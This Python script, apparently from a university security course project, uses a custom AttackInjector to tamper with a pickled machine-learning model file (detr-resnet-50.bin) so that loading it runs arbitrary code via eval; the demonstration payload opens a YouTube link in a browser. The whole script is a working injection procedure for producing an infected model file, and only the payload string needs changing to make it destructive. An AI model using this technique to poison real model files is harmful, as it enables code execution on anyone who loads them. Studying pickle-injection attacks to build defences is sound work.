import pickle
import builtins
from extract_pickle import PickleEC
from code_injection.attackinjector import AttackInjector

# First, we instantiate our pickle extractor and attack injector
pk_extractor = PickleEC()
attack_injector =  AttackInjector(pk_extractor)

# Next, we define attack(s) we want to carry out
bad_module = "__builtin__\neval"
payload = '''import webbrowser
webbrowser.open("https://www.youtube.com/watch?v=gDjMZvYWUdo")
import sys
del sys.modules['webbrowser']
'''

attacks = [AttackInjector.memo_inject_attack]
attack_indices = [200] # Indicies in original pickle file before tampering (in order pls)
attack_args = [(bad_module,)]

# Injection time on binary file (Happens sequentially)
in_bin_dir = "/Users/alrivero/Documents/CSE_508/mal_bins/detr/detr-resnet-50.bin"
out_bin_dir = "/Users/alrivero/Documents/CSE_508/mal_bins/detr/detr-resnet-50-memo-infected.bin"
memo_start_inds = attack_injector.inject_attacks_bin(
    attacks,
    attack_indices,
    attack_args,
    in_bin_dir,
    out_bin_dir
)

# Now inject a few attacks that use the memo
attacks = [AttackInjector.module_attack_using_memo, AttackInjector.module_attack_using_memo]
attack_indices = [256, 1000] # Indicies in original pickle file before tampering (in order pls)
attack_args = [(memo_start_inds[0], payload), (memo_start_inds[0], payload)]

attack_injector.inject_attacks_bin(
    attacks,
    attack_indices,
    attack_args,
    out_bin_dir,
    out_bin_dir
)
